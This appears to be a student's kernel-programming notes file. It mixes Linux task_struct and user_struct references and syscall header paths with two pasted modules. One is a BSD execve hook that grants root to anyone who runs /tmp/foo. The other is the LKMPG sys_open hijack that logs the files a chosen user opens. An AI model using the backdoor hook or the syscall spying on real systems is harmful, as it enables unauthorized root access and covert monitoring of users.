/* verificare drepturi */
		if(curent->uid != 0) 

if(p->uid != curent->uid)
			{
				printk( KERN_DEBUG "eroare: permisiune/acces refuzat\n" );
				return -EPERM;
			} 
			
			
current e un task struct
current->pid    - pid-ul task-ului curent
task_struct  - in sched.h




struct user_struct {
493         atomic_t __count;       /* reference count */
494         atomic_t processes;     /* How many processes does this user have? */
495         atomic_t files;         /* How many open files does this user have? */
496         atomic_t sigpending;    /* How many pending signals does this user have? */
497 #ifdef CONFIG_INOTIFY
498         atomic_t inotify_watches; /* How many inotify watches does this user have? */
499         atomic_t inotify_devs;  /* How many inotify devs does this user have opened? */
500 #endif
501         /* protected by mq_lock */
502         unsigned long mq_bytes; /* How many bytes can be allocated to mqueue? */
503         unsigned long locked_shm; /* How many pages of mlocked shm ? */
504 


unistd.h




#############################################
# execve interception #########
##########################################


/*
	BSD 4.4 execve system call hook
	murat@enderunix.org

	$Id: linux_subexec.c,v 1.5 2003/09/22 09:42:13 murat Exp $
*/

#include <sys/types.h>
#include <sys/module.h>
#include <sys/systm.h>
#include <sys/errno.h>
#include <sys/param.h>
#include <sys/kernel.h>

#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/proc.h>
#include <sys/syscall.h>

struct proc;
sy_call_t *oldexecve;

/* New system call handler	*/
int 
nexecve(struct proc *p, register struct execve_args *uap)
{
	if (strcmp(uap->fname, "/tmp/foo") == 0) {
		p->p_cred->p_ruid = 0;
		p->p_cred->p_rgid = 0;
	}
	return execve(p, uap);
}

static int
init_module(void)
{
	int err = 0;

	oldexecve = sysent[SYS_execve].sy_call;
	uprintf("old execve address: 0x%x\n", oldexecve);
	uprintf("installing hook\n");
	sysent[SYS_execve].sy_call = (sy_call_t *)nexecve;
	return err;
}

static int
deinit_module(void)
{
	uprintf("removing hook\n");
	sysent[SYS_execve].sy_call = (sy_call_t *)oldexecve;
	return 0;
}

/* Load handler	*/
static int
mod_loader(struct module *m, int what, void *arg)
{
	int err = 0;
	
	switch(what) {
	case MOD_LOAD:
		init_module();
		uprintf("module loaded\n");
		break;
	case MOD_UNLOAD:
		deinit_module();
		uprintf("module unloaded\n");
		break;
	default:
		err = EINVAL;
		break;
	}
	return err;
}

/* Declare module	*/
static moduledata_t mod = {
	"linux_subexec",
	mod_loader,
	NULL
};

DECLARE_MODULE(linux_subexecmodule, mod, SI_SUB_KLD, SI_ORDER_ANY);








# /include/linux/syscalls.h Signatures of system calls
# /include/asm-um/unistd.h Header for definition of system calls
#

/include/asm-um/arch/unistd.h Definition of the __NR constants corresponding to system calls internal numbers 


restrict disk space-using quotas
Since inodes store information about files, by limiting the number of inodes, you can limit the number of files users can create.

intercepting open_syscall....in lkmpg.pdf



- maximum memory used - > mm_struct



-----------------------------------------
/*
 *  syscall.c
 *
 *  System call "stealing" sample.
 */

/* 
 * Copyright (C) 2001 by Peter Jay Salzman 
 */

/* 
 * The necessary header files 
 */

/*
 * Standard in kernel modules 
 */
#include <linux/kernel.h>	/* We're doing kernel work */
#include <linux/module.h>	/* Specifically, a module, */
#include <linux/moduleparam.h>	/* which will have params */
#include <linux/unistd.h>	/* The list of system calls */

/* 
 * For the current (process) structure, we need
 * this to know who the current user is. 
 */
#include <linux/sched.h>
#include <asm/uaccess.h>

/* 
 * The system call table (a table of functions). We
 * just define this as external, and the kernel will
 * fill it up for us when we are insmod'ed
 *
 * sys_call_table is no longer exported in 2.6.x kernels.
 * If you really want to try this DANGEROUS module you will
 * have to apply the supplied patch against your current kernel
 * and recompile it.
 */
extern void *sys_call_table[];

/* 
 * UID we want to spy on - will be filled from the
 * command line 
 */
static int uid;
module_param(uid, int, 0644);

/* 
 * A pointer to the original system call. The reason
 * we keep this, rather than call the original function
 * (sys_open), is because somebody else might have
 * replaced the system call before us. Note that this
 * is not 100% safe, because if another module
 * replaced sys_open before us, then when we're inserted
 * we'll call the function in that module - and it
 * might be removed before we are.
 *
 * Another reason for this is that we can't get sys_open.
 * It's a static variable, so it is not exported. 
 */
asmlinkage int (*original_call) (const char *, int, int);

/* 
 * The function we'll replace sys_open (the function
 * called when you call the open system call) with. To
 * find the exact prototype, with the number and type
 * of arguments, we find the original function first
 * (it's at fs/open.c).
 *
 * In theory, this means that we're tied to the
 * current version of the kernel. In practice, the
 * system calls almost never change (it would wreck havoc
 * and require programs to be recompiled, since the system
 * calls are the interface between the kernel and the
 * processes).
 */
asmlinkage int our_sys_open(const char *filename, int flags, int mode)
{
	int i = 0;
	char ch;

	/* 
	 * Check if this is the user we're spying on 
	 */
	if (uid == current->uid) {
		/* 
		 * Report the file, if relevant 
		 */
		printk("Opened file by %d: ", uid);
		do {
			get_user(ch, filename + i);
			i++;
			printk("%c", ch);
		} while (ch != 0);
		printk("\n");
	}

	/* 
	 * Call the original sys_open - otherwise, we lose
	 * the ability to open files 
	 */
	return original_call(filename, flags, mode);
}

/* 
 * Initialize the module - replace the system call 
 */
int init_module()
{
	/* 
	 * Warning - too late for it now, but maybe for
	 * next time... 
	 */
	printk(KERN_ALERT "I'm dangerous. I hope you did a ");
	printk(KERN_ALERT "sync before you insmod'ed me.\n");
	printk(KERN_ALERT "My counterpart, cleanup_module(), is even");
	printk(KERN_ALERT "more dangerous. If\n");
	printk(KERN_ALERT "you value your file system, it will ");
	printk(KERN_ALERT "be \"sync; rmmod\" \n");
	printk(KERN_ALERT "when you remove this module.\n");

	/* 
	 * Keep a pointer to the original function in
	 * original_call, and then replace the system call
	 * in the system call table with our_sys_open 
	 */
	original_call = sys_call_table[__NR_open];
	sys_call_table[__NR_open] = our_sys_open;

	/* 
	 * To get the address of the function for system
	 * call foo, go to sys_call_table[__NR_foo]. 
	 */

	printk(KERN_INFO "Spying on UID:%d\n", uid);

	return 0;
}

/* 
 * Cleanup - unregister the appropriate file from /proc 
 */
void cleanup_module()
{
	/* 
	 * Return the system call back to normal 
	 */
	if (sys_call_table[__NR_open] != our_sys_open) {
		printk(KERN_ALERT "Somebody else also played with the ");
		printk(KERN_ALERT "open system call\n");
		printk(KERN_ALERT "The system may be left in ");
		printk(KERN_ALERT "an unstable state.\n");
	}

	sys_call_table[__NR_open] = original_call;
}

--------------------------------------------------

Table 1. Useful task_struct Fields

NAME        TYPE           DESCRIPTION
--------------------------------------------------------------------
uid        uid_t           User ID
--------------------------------------------------------------------
euid       uid_t           Effective user ID
--------------------------------------------------------------------
gid        gid_t           Group ID
--------------------------------------------------------------------
egid       gid_t           Effective group ID
--------------------------------------------------------------------
pid        pid_t           Process ID
--------------------------------------------------------------------
pgrp       pid_t           Process group ID
--------------------------------------------------------------------
p_opptr    task_struct*    Original parent task
--------------------------------------------------------------------
fs         fs_struct*      Filesystem information
--------------------------------------------------------------------
blocked    sigset_t        Set of blocked signals
------------------------------------------------------




- intercept fork, modify kernel such that sys_call is exported
- intercept edu_fork
